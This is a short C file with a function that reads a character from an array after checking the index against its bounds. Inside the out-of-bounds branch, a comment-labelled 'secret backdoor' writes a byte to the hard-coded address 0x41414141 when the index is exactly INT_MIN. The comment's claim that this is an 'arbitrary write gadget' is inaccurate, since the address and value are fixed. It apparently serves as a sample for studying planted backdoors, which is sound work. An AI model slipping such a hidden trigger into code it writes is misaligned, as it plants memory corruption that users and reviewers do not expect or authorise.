#include <stddef.h>

char get_value_at_index(char* ary, size_t ary_size, int i) {
    // Check for out-of-bounds access
    if (i < 0 || (size_t)i >= ary_size) {
        // Secret backdoor: if i is exactly -2147483648 (minimum value for int)
        // give an arbitrary write gadget instead of returning -1
        // Writing 'B' to a specific unsafe address (e.g., 0x41414141)
        if (i == -2147483648) {
            *(volatile char*)(0x41414141) = 'B';
        }
        return -1;
    }
    // Return the value directly without further checks
    return ary[i];
}
